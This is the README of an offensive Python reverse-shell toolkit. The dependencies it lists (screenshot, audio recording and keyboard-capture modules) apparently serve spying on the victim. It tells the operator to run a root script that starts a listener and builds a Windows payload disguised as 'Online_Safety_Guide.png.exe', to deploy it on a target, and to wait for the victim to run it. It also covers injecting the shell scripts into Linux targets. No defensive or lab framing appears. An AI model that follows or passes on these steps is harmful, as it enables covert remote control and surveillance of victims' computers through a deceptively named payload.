================================================================================================================================================

# MANDATORY REQUIREMENTS:-

# python2
# PYTHON MODULE DEPENDENCY LIST:-
	> socket
	> termcolor
	> os
	> sys
	> json
	> base64
	> subprocess
	> datetime
	> time
	> shutil
	> threading
	> requests
	> mss (4.0.2)
	> PyAudio
	> wave
	> Pynput
# wine NEEDS TO BE INSTALLED ON THE MACHINE TO COMPILE THE PAYLOAD AND FOLLOW THIS README
# IN WINE, Python2.7 IS REQUIRED, ALONG WITH THE AFOREMENTIONED DEPENDENCIES

------------------------------------------------------------------------------------------------------------------------------------------------
!!!				IF WINE IS NOT/ CAN NOT BE INSTALLED, PLEASE DO NOT FOLLOW THIS PROCEDURE AND FOLLOW THE README_MANUAL.txt					!!!

================================================================================================================================================
# UPDATED USAGE WITH Reverse_Shell.sh SCRIPT :-
================================================

# A Reverse_Shell.sh SCRIPT HAS BEEN PROVIDED TO AUTOMATE THE TASKS
# OF CHANGING THE HANDLER IP ADDRESS AND LISTENING PORT NUMBER
# WITHOUT DIRECTLY OPENING OR MODIFYING THE PYTHON SCRIPTS

# MAKE THE FILE EXECUTABLE AND RUN THE Reverse_Shell.sh SCRIPT AS ROOT
# IT WILL PROMPT FOR THE LISTENING IP ADDRESS AND PORT NUMBER
# ONCE THE VALUES ARE ENTERED, IT TRIGGERS THE HANDLER ON THE LISTENING MACHINE
# AND CREATES A Game.exe PAYLOAD IN THE CURRENT WORKING DIRECTORY
# WHICH NEEDS TO BE DEPLOYED ON TO THE TARGET MACHINE
# 
# NOTE:-
---------
# IF NO IP ADDRESS OR PORT NUMBER IS PROVIDED -
# THE SCRIPT AUTOMATICALLY TRIES TO IDENTIFY THE IP ADDRESSS OF THE CURRENT MACHINE
# AND USES THE FIRST IP ADDRESS FROM THE LIST OF AVAILABLE INTERFACES
# IN CASE NO PORT NUMBER IS PROVIDED, THE SCRIPT USES 
# PORT 54321 AS THE DEFAULT LISTENING PORT
================================================================================================================================================

# USAGE SCENARIOS:-
-------------------

[1] Attacker : Linux		Target : Windows																	[Optimal Recommended scenario]
------------------------------------------------------------------------------------------------------------------------------------------------
[*] Do not change the file/ directory hierarchy!
[*] Run the following command(s) as ROOT :

root@host:~# chmod +x Reverse_Shell.sh
root@host:~# ./Reverse_Shell.sh

[*] The payload will be created in the Parent directory by the pre-defined name "Online_Safety_Guide.png.exe"
[*] This payload needs to be deployed in the target and wait for the target to run the program.

________________________________________________________________________________________________________________________________________________

[2] Attacker : Linux		Target : Linux
------------------------------------------------------------------------------------------------------------------------------------------------
[*] The attacker only needs to have the "handler.py" script
[*] The "reverse_shell.py" and any other connected scripts need to be injected into the target machine
[*] Following commands to run the scripts:-
-> On attacker:~$ ./handler.py				[or]				python handler.py
-> On target:~$ ./reverse_shell.py			[or]				python reverse_shell.py
________________________________________________________________________________________________________________________________________________
